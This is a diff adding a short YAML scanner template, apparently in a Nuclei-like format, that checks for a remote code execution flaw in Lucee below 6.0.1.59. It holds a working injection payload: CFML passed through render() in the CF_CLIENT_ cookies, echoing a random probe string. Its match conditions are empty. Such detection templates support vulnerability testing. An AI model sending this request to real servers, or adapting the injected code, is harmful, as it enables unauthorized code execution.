@@ -1,0 +1,18 @@
+id: lucee-rce
+brief:
+    title: Lucee < 6.0.1.59 - Remote Code Execution
+    by: rootxharsh
+    level: critical
+    about: ""
+    label:
+        - lucee
+        - rce
+        - oast
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Cookie: CF_CLIENT_=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>'); CF_CLIENT_LUCEE=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>');
+      signs: []
